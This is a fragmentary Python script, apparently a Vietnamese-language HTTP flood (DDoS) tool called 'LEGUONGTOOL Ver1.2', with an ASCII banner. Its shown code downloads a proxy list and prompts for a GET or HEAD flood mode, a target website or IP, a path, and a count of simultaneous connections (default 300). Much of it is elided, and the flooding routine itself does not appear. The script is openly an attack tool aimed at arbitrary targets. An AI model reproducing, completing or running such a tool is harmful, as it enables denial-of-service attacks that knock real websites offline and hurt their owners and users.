...
print ('''\r\n
          _        _______  _______           _______  _        _______ _________ _______  _______  _       
( \      (  ____ \(  ____ \|\     /|(  ___  )( (    /|(  ____ \\__   __/(  ___  )(  ___  )( \      │
| (      | (    \/| (    \/| )   ( || (   ) ||  \  ( || (    \/   ) (   | (   ) || (   ) || (      │   
| |      | (__    | |      | |   | || |   | ||   \ | || |         | |   | |   | || |   | || |      │     
| |      |  __)   | |      | |   | || |   | || (\ \) || | ____    | |   | |   | || |   | || |      │        
| |      | (      | |      | |   | || |   | || | \   || | \_  )   | |   | |   | || |   | || |      │    
| (____/\| (____/\| (____/\| (___) || (___) || )  \  || (___) |   | |   | (___) || (___) || (____/\│
(_______/(_______/(_______/(_______)(_______)|/    )_)(_______)   )_(   (_______)(_______)(_______/│
│Ver1.2
𝘼𝙉 𝙉𝙄𝙉𝙃 𝙇𝘼̀ 𝙏𝙍𝙀̂𝙉 𝙃𝙀̂́𝙏 𝙃𝘼̃𝙔 𝘽𝘼̉𝙊 𝙑𝙀̣̂ 𝙑𝙄𝙀̣̂𝙏 𝙉𝘼𝙈 𝙆𝙃𝙊̂𝙉𝙂 𝘿𝘿𝙊𝙎 𝘾𝙃𝙄́𝙉𝙃 𝙋𝙃𝙐̉ 𝙑𝙄𝙀̣̂𝙏 𝙉𝘼𝙈   
...
def clone():
    ...
    try:
        ...
        f.close()
    print("ĐÃ HOÀN THÀNH TẢI FILE PROXY")
...
def main():
    ...
    global multiple
    global mode
    mode = str(input("Chọn chế độ (GET Flood/HEAD) [GET/HEAD]:"))
    if mode == "":
        mode = "get"
    else:
        mode = str(mode)
    ...
    ip = str(input("Địa Chỉ Web/IP (Địa chỉ web lên https://check-host.net/ để check):"))
    prevent()
    if ip == "":
        print("KHÔNG ĐỂ TRỐNG IP HAY WEBSITE!")
        exit()
    page = str(input("Đường Dẫn (Mặc Định=/HTTP):"))
    if page == "":
        page = "/"
    ...
    if port == 443:
        print("CỔNG NHÀ 443!")        
    th_num = str(input("Số kết nối cùng lúc (DEAFAULT=300):"))
    if th_num == "":
        th_num = int(300)
    else:
        th_num = int(th_num)
